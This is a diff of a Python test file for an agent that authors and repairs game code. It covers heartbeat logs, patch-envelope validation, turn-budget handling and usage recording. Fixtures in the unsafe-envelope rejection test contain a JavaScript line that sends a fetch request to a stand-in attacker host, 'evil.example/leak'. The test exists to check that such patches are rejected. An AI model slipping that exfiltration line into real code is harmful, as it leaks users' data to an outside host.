@@ -192,10 +192,20 @@ def test_session_lists_and_searches_bundle_with_structured_events(monkeypatch):
 
 
 def test_agent_heartbeat_logs_bundle_activity(monkeypatch):
-    monkeypatch.setattr(code_agent.tracing, "record_step_log", lambda line, *, step_id=None, payload=None: True)
+    events = []
+    monkeypatch.setattr(
+        code_agent.tracing,
+        "record_step_log",
+        lambda line, *, step_id=None, payload=None: events.append(payload) or True,
+    )
     s = code_agent.RepairSession.from_files(_files(), live_step_id="step-1")
 
-    stop, thread = code_agent._start_heartbeat(s, agent_name="GameCodeAuthor", interval=0.01)
+    stop, thread = code_agent._start_heartbeat(
+        s,
+        agent_name="GameCodeAuthor",
+        operation="authoring",
+        interval=0.01,
+    )
     try:
         for _ in range(30):
             if s.log_lines:
@@ -207,6 +217,29 @@ def test_agent_heartbeat_logs_bundle_activity(monkeypatch):
     assert any("agent authoring waiting on model response:" in line for line in s.log_lines)
     assert any("since last tool" in line for line in s.log_lines)
     assert any("bundle=3 file(s)" in line for line in s.log_lines)
+    heartbeat = next(event for event in events if event and event.get("type") == "heartbeat")
+    assert heartbeat["operation"] == "authoring"
+    assert heartbeat["agent"] == "GameCodeAuthor"
+    assert "files_in_context" not in heartbeat
+
+
+def test_author_team_heartbeat_is_not_reported_as_repairing(monkeypatch):
+    monkeypatch.setattr(code_agent.tracing, "record_step_log", lambda line, *, step_id=None, payload=None: True)
+    s = code_agent.RepairSession.from_files(_files(), live_step_id="step-1")
+
+    stop, thread = code_agent._start_heartbeat(
+        s,
+        agent_name="RulesAndSimulationCoder",
+        operation="authoring",
+        interval=0.01,
+    )
+    try:
+        time.sleep(0.03)
+    finally:
+        code_agent._stop_heartbeat(stop, thread)
+
+    assert any("agent authoring waiting on model response:" in line for line in s.log_lines)
+    assert not any("agent repairing waiting on model response:" in line for line in s.log_lines)
 
 
 def test_session_patch_resets_checks_flag():
@@ -343,9 +376,8 @@ def test_native_apply_patch_editor_uses_structured_operations_directly():
     assert "helper.js" not in s.contents and "runtime.js" not in s.contents
 
 
-def test_structured_patch_operation_rejects_full_patch_envelope_atomically():
+def test_structured_patch_operation_accepts_matching_single_file_envelope():
     s = code_agent.RepairSession.from_files(_files())
-    original = dict(s.contents)
 
     out = s.apply_patch_operation(
         "update_file",
@@ -359,9 +391,67 @@ def test_structured_patch_operation_rejects_full_patch_envelope_atomically():
         ),
     )
 
-    assert "must contain only V4A content/context lines" in out
+    assert "patched game.js" in out
+    assert s.read_file("game.js") == "var score = 1;"
+
+
+@pytest.mark.parametrize(
+    "diff",
+    [
+        (
+            "*** Begin Patch\n"
+            "*** Update File: style.css\n"
+            "-var score = 0; fetch('https://evil.example/leak');\n"
+            "+var score = 1;\n"
+            "*** End Patch"
+        ),
+        (
+            "*** Begin Patch\n"
+            "*** Update File: game.js\n"
+            "-var score = 0; fetch('https://evil.example/leak');\n"
+            "+var score = 1;\n"
+            "*** Update File: style.css\n"
+            "-canvas{display:block}\n"
+            "+canvas{display:grid}\n"
+            "*** End Patch"
+        ),
+        (
+            "*** Begin Patch\n"
+            "*** Update File: game.js\n"
+            "-var score = 0; fetch('https://evil.example/leak');\n"
+            "+var score = 1;\n"
+            "*** Delete File: style.css\n"
+            "*** End Patch"
+        ),
+    ],
+)
+def test_structured_patch_operation_rejects_unsafe_envelopes_atomically(diff):
+    s = code_agent.RepairSession.from_files(_files())
+    original = dict(s.contents)
+
+    out = s.apply_patch_operation("update_file", path="game.js", diff=diff)
+
+    assert "must contain exactly one matching update_file header" in out
     assert s.contents == original
     assert s.changed == set() and s.last_patch_delta is None
+
+
+def test_structured_create_operation_accepts_matching_single_file_envelope():
+    s = code_agent.RepairSession.from_files(_files())
+
+    out = s.apply_patch_operation(
+        "create_file",
+        path="helper.js",
+        diff=(
+            "*** Begin Patch\n"
+            "*** Add File: helper.js\n"
+            "+export const ready = true;\n"
+            "*** End Patch"
+        ),
+    )
+
+    assert "added helper.js" in out
+    assert s.read_file("helper.js") == "export const ready = true;"
 
 
 def test_make_tools_exposes_apply_patch_as_function_tool():
@@ -636,6 +726,12 @@ def test_run_repair_returns_none_for_empty_bundle():
     assert code_agent.run_repair([], error="whatever") is None
 
 
+def test_code_agent_facade_exports_project_revision_runner():
+    from app.agents import author_runner
+
+    assert code_agent.run_revision is author_runner.run_revision
+
+
 def test_build_input_labels_failure_source():
     default = code_agent._build_input(_files(), "boom", "2d", None)
     assert default.startswith("Build validation failed with:")
@@ -671,6 +767,11 @@ _SHEET_ISSUE = (
     "from gameConfig.sheet frames instead of procedural shapes"
 )
 
+_ROTATION_ISSUE = (
+    "generated top-down avatar body rotates toward movement/aim; keep the humanoid pose-sheet "
+    "sprite at rotation 0, use pose frames/flipX for facing, and rotate only the weapon"
+)
+
 
 def test_classify_gameplay_failure_quality_issues_are_patchable():
     # 质量门禁（素材未接线等）是局部接线问题 → 最小 patch，不整包重生成
@@ -680,6 +781,8 @@ def test_classify_gameplay_failure_quality_issues_are_patchable():
     runtime = "browser page error: TypeError: boom"
     kind, picked = nodes._classify_gameplay_failure(_qa_result([runtime, _SHEET_ISSUE]))
     assert kind == "runtime" and set(picked) == {runtime, _SHEET_ISSUE}
+    kind, picked = nodes._classify_gameplay_failure(_qa_result([_ROTATION_ISSUE]))
+    assert kind == "quality" and picked == [_ROTATION_ISSUE]
     # 混入玩法指标问题 → 整包重生成
     assert nodes._classify_gameplay_failure(_qa_result([_SHEET_ISSUE, "no input handling found"]))[0] == "design"
     # 质量问题伴随零帧症状：包可能根本没跑起来，patch 无从下手
@@ -733,6 +836,41 @@ def test_gameplay_repair_regen_carries_qa_feedback(monkeypatch):
     assert out["generated_files"] == []
     assert out["gameplay_qa_feedback"] == [_SHEET_ISSUE]
     assert nodes.next_after_gameplay_repair(out) == "code_generation"
+
+
+def test_gameplay_repair_preserves_changed_vite_candidate_at_turn_limit(monkeypatch):
+    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
+    repaired = _files() + [
+        {"path": "src/scenes/PlayScene.ts", "content": "export class PlayScene {}"}
+    ]
+    monkeypatch.setattr(
+        code_agent,
+        "run_repair",
+        lambda files, **kw: _outcome(
+            files=repaired,
+            changed=["src/scenes/PlayScene.ts"],
+            checks_ok=False,
+            note="max turns (8) exhausted",
+        ),
+    )
+
+    out = nodes.gameplay_repair_node(
+        {
+            "gameplay_repair_attempts": 0,
+            "artifact_format": "phaser-vite/v1",
+            "project_files": _files(),
+            "generated_files": [],
+            "use_real": True,
+            "gameplay_qa_result": _qa_result([_SHEET_ISSUE]),
+        }
+    )
+
+    assert out["project_files"] == repaired
+    assert out["generated_files"] == []
+    assert out["gameplay_qa_result"] == {}
+    assert "gameplay_qa_feedback" not in out
+    assert nodes.next_after_gameplay_repair(out) == "project_build"
+    assert any("preserved modular repair candidate" in line for line in out["_logs"])
 
 
 def test_build_author_input_includes_qa_feedback():
@@ -989,7 +1127,8 @@ def test_run_author_returns_none_for_empty_bundle():
 
 
 @pytest.mark.parametrize("detailed_enabled", [False, True])
-def test_execute_agent_uses_responses_model(monkeypatch, detailed_enabled):
+@pytest.mark.parametrize("hit_limit", [False, True])
+def test_execute_agent_uses_responses_model(monkeypatch, detailed_enabled, hit_limit):
     from app.agents import author_runner
 
     agents_module = ModuleType("agents")
@@ -1039,7 +1178,16 @@ def test_execute_agent_uses_responses_model(monkeypatch, detailed_enabled):
             )
 
         async def stream_events(self):
-            response = SimpleNamespace(id="resp-test")
+            response = SimpleNamespace(
+                id="resp-test",
+                model=code_agent.settings.CODE_AGENT_MODEL or code_agent.settings.MODEL_NAME,
+                usage=SimpleNamespace(
+                    input_tokens=11,
+                    output_tokens=7,
+                    total_tokens=18,
+                    input_tokens_details=SimpleNamespace(cached_tokens=0),
+                ),
+            )
             yield SimpleNamespace(
                 type="raw_response_event",
                 data=SimpleNamespace(
@@ -1052,6 +1200,8 @@ def test_execute_agent_uses_responses_model(monkeypatch, detailed_enabled):
                     type="response.completed", response=response, sequence_number=1
                 ),
             )
+            if hit_limit:
+                raise TimeoutError("turn budget reached")
 
         def to_input_list(self):
             return []
@@ -1096,9 +1246,20 @@ def test_execute_agent_uses_responses_model(monkeypatch, detailed_enabled):
     monkeypatch.setitem(sys.modules, "agents.exceptions", exceptions_module)
     monkeypatch.setitem(sys.modules, "openai", openai_module)
     monkeypatch.setattr(code_agent, "available_skills", lambda: [])
-    monkeypatch.setattr(code_agent.llm, "record_usage", lambda *args, **kwargs: None)
+    recorded_usage = []
+    monkeypatch.setattr(
+        code_agent.llm,
+        "record_response_usage",
+        lambda **kwargs: recorded_usage.append(kwargs),
+    )
     monkeypatch.setattr(code_agent.settings, "CODE_AGENT_PROMPT_CACHE_KEY_PREFIX", "cache-test")
     trace_events = []
+    structured_events = []
+    monkeypatch.setattr(
+        code_agent.tracing,
+        "record_step_log",
+        lambda line, *, step_id=None, payload=None: structured_events.append(payload) or True,
+    )
 
     class FakeRecorder:
         def record(self, event_type, payload, **kwargs):
@@ -1130,10 +1291,17 @@ def test_execute_agent_uses_responses_model(monkeypatch, detailed_enabled):
         task_input="input",
         turns_limit=5,
         workflow_name="test-workflow",
+        operation="repairing",
     )
 
     expected_model = code_agent.settings.CODE_AGENT_MODEL or code_agent.settings.MODEL_NAME
     assert outcome is not None
+    assert outcome.tokens == 18
+    assert outcome.stop_reason == ("max_turns" if hit_limit else "completed")
+    if hit_limit:
+        assert outcome.raw_output is None
+    else:
+        assert outcome.raw_output == "FIXED: ok"
     assert captured["model"] == expected_model
     assert captured["agent"]["model"].__class__ is FakeResponsesModel
     assert captured["run"]["max_turns"] == 5
@@ -1141,11 +1309,35 @@ def test_execute_agent_uses_responses_model(monkeypatch, detailed_enabled):
     assert captured["run_config"]["tracing_disabled"] is True
     assert captured["model_settings"]["parallel_tool_calls"] is False
     assert captured["run"]["hooks"] is (trace_hooks if detailed_enabled else None)
-    assert [event[0] for event in trace_events] == (
-        ["run_start", "llm_stream_event", "llm_stream_event", "run_end"]
-        if detailed_enabled
-        else []
+    assert len(recorded_usage) == 1
+    assert recorded_usage[0]["provider_response_id"] == "resp-test"
+    assert recorded_usage[0]["request_index"] == 1
+    assert recorded_usage[0]["agent"] == "GameCodeRepair"
+    assert recorded_usage[0]["workflow_name"] == "test-workflow"
+    assert recorded_usage[0]["model"] == expected_model
+    assert recorded_usage[0]["prompt_tokens"] == 11
+    assert recorded_usage[0]["completion_tokens"] == 7
+    assert recorded_usage[0]["step_id"] is None
+    assert len(recorded_usage[0]["run_id"]) == 36
+    expected_trace_events = (
+        ["run_start", "llm_stream_event", "llm_stream_event", "run_error"]
+        if hit_limit
+        else ["run_start", "llm_stream_event", "llm_stream_event", "run_end"]
     )
+    assert [event[0] for event in trace_events] == (
+        expected_trace_events if detailed_enabled else []
+    )
+    budget_events = [
+        event
+        for event in structured_events
+        if event and event.get("type") == "role_budget_exhausted"
+    ]
+    assert bool(budget_events) is hit_limit
+    if hit_limit:
+        assert budget_events[-1]["agent"] == "GameCodeRepair"
+        assert budget_events[-1]["operation"] == "repairing"
+        assert budget_events[-1]["status"] == "partial"
+        assert outcome.note == "max turns (5) exhausted"
     cache_key = captured["model_settings"]["extra_args"]["prompt_cache_key"]
     # 前缀:工作流:任务级后缀 —— 此处未绑定 task_id,后缀回退每跑唯一随机 hex
     prefix, workflow, run_suffix = cache_key.split(":")
@@ -1154,6 +1346,97 @@ def test_execute_agent_uses_responses_model(monkeypatch, detailed_enabled):
     assert captured["client_kwargs"]["base_url"] == code_agent.settings.OPENAI_BASE_URL
     assert captured["client_kwargs"]["max_retries"] == 0
     assert captured["closed"] is True
+
+
+def test_execute_agent_preserves_written_candidate_after_stream_failure(monkeypatch):
+    from app.agents import author_runner
+
+    agents_module = ModuleType("agents")
+    exceptions_module = ModuleType("agents.exceptions")
+
+    class FakeAgent:
+        def __init__(self, **_kwargs):
+            pass
+
+    class FakeResponsesModel:
+        def __init__(self, **_kwargs):
+            pass
+
+    class FakeConfig:
+        def __init__(self, **_kwargs):
+            pass
+
+    class FakeRunner:
+        pass
+
+    class FakeAgentsException(Exception):
+        pass
+
+    class FakeMaxTurnsExceeded(Exception):
+        pass
+
+    def fake_function_tool(fn):
+        return fn
+
+    agents_module.Agent = FakeAgent
+    agents_module.ModelSettings = FakeConfig
+    agents_module.OpenAIResponsesModel = FakeResponsesModel
+    agents_module.RunConfig = FakeConfig
+    agents_module.Runner = FakeRunner
+    agents_module.function_tool = fake_function_tool
+    exceptions_module.AgentsException = FakeAgentsException
+    exceptions_module.MaxTurnsExceeded = FakeMaxTurnsExceeded
+
+    openai_module = ModuleType("openai")
+
+    class FakeAsyncOpenAI:
+        def __init__(self, **_kwargs):
+            pass
+
+        async def close(self):
+            pass
+
+    openai_module.AsyncOpenAI = FakeAsyncOpenAI
+    monkeypatch.setitem(sys.modules, "agents", agents_module)
+    monkeypatch.setitem(sys.modules, "agents.exceptions", exceptions_module)
+    monkeypatch.setitem(sys.modules, "openai", openai_module)
+    monkeypatch.setattr(author_runner.detailed_trace, "create_recorder", lambda **_kwargs: None)
+
+    async def fail_after_write(
+        _runner,
+        _agent,
+        _task_input,
+        *,
+        session,
+        **_kwargs,
+    ):
+        path = "src/systems/rules/PartialRules.ts"
+        session.contents[path] = "export const PartialRules = 1;"
+        session.order.append(path)
+        session.changed.add(path)
+        raise RuntimeError("peer closed connection (incomplete chunked read)")
+
+    monkeypatch.setattr(author_runner, "_run_agent_streamed", fail_after_write)
+    session = code_agent.RepairSession.from_files(_files())
+
+    outcome = code_agent._execute_agent(
+        session,
+        agent_name="RulesAndSimulationCoder",
+        instructions="author rules",
+        author_tools=False,
+        task_input="input",
+        turns_limit=5,
+        workflow_name="partial-stream-test",
+        operation="authoring",
+        terminal_completion=False,
+        preserve_partial_on_error=True,
+    )
+
+    assert outcome is not None
+    assert outcome.stop_reason == "stream_error"
+    assert outcome.quality_state == "unchecked"
+    assert "src/systems/rules/PartialRules.ts" in outcome.changed
+    assert any("preserving candidate for validation" in line for line in outcome.logs)
 
 
 def test_prompt_cache_key_is_task_scoped(monkeypatch):
@@ -1178,6 +1461,28 @@ def test_prompt_cache_key_is_task_scoped(monkeypatch):
     # 前缀为空(未启用)则不发 prompt_cache_key
     monkeypatch.setattr(author_runner.settings, "CODE_AGENT_PROMPT_CACHE_KEY_PREFIX", " ")
     assert author_runner._prompt_cache_key("wf") is None
+
+
+def test_prompt_cache_key_hashes_long_targeted_retry_workflows(monkeypatch):
+    from app.agents import author_runner
+    from app.core.telemetry import bind_context
+
+    monkeypatch.setattr(
+        author_runner.settings, "CODE_AGENT_PROMPT_CACHE_KEY_PREFIX", "cache-test"
+    )
+    bind_context(task_id="c166a81f-aa2d-4e55-9888-62093034a923")
+    try:
+        workflow = (
+            "gameweave-author-presentation-interaction-targeted-retry-with-long-suffix"
+        )
+        key = author_runner._prompt_cache_key(workflow)
+
+        assert key is not None
+        assert len(key) <= 64
+        assert key.startswith("cache-test:gameweave-author-")
+        assert key == author_runner._prompt_cache_key(workflow)
+    finally:
+        bind_context(task_id=None)
 
 
 def test_author_input_carries_spec_design_and_runtime():
